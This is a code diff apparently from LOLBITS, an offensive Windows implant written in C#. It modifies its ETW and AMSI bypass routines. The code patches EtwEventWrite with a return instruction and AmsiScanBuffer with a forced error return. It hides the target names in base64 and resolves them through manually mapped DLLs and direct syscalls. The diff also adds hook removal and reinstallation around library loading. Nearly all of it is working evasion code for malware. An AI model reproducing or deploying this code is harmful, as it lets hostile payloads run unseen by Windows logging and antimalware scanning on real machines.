@@ -5,6 +5,7 @@ using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Text;
 using System.Threading;
+using LOLBITS.Protection;
 using LOLBITS.TokenManagement;
 
 
@@ -233,19 +234,22 @@ namespace LOLBITS
             return int.Parse(spl[2]);
         }
 
-        public static bool handleETW(SysCallManager sysCall)
+        public static bool handleETW(SysCallManager sysCall, HookManager hookManager)
         {
             
             var hook = new byte[] { 0xc3 };
             uint oldProtect = 0, x = 0;
             var shellCode = sysCall.GetSysCallAsm("NtWriteVirtualMemory");
-
+            hookManager.Uninstall(); //getMappedModule may require LoadLibraryA for new modules
             sysCall.getMappedModule("C:\\Windows\\System32\\advapi32.dll"); // this saves time on further actions when trying to access advapi32 functions
             DInvoke.PE.PE_MANUAL_MAP moduleDetails = sysCall.getMappedModule("C:\\Windows\\System32\\kernel32.dll");
             object[] loadLibrary = { "ntdll.dll" };
 
+            
             IntPtr libraryAddress = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "LoadLibraryA", 
                                                                                       typeof(DInvoke.Win32.DELEGATES.LoadLibrary), loadLibrary);
+            hookManager.Install();
+
             object[] procAddress = {libraryAddress, Encoding.UTF8.GetString(Convert.FromBase64String("RXR3RXZlbnRXcml0ZQ=="))};
 
             var address = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "GetProcAddress", 
@@ -283,7 +287,7 @@ namespace LOLBITS
             return true;
         }
 
-        public static bool handleAM(SysCallManager sysCall)
+        public static bool handleAM(SysCallManager sysCall, HookManager hookManager)
         {
 
             var hook = new byte[] { 0xB8,0x57,0x00,0x07,0x80,0xC3 };
@@ -292,9 +296,12 @@ namespace LOLBITS
 
             DInvoke.PE.PE_MANUAL_MAP moduleDetails = sysCall.getMappedModule("C:\\Windows\\System32\\kernel32.dll");
             object[] loadLibrary = { Encoding.UTF8.GetString(Convert.FromBase64String("YW1zaS5kbGw=")) };
+            hookManager.Uninstall();
 
             IntPtr libraryAddress = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "LoadLibraryA",
                                                                                       typeof(DInvoke.Win32.DELEGATES.LoadLibrary), loadLibrary);
+            hookManager.Install();
+
             object[] procAddress = { libraryAddress, Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI="))};
 
             var address = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "GetProcAddress",
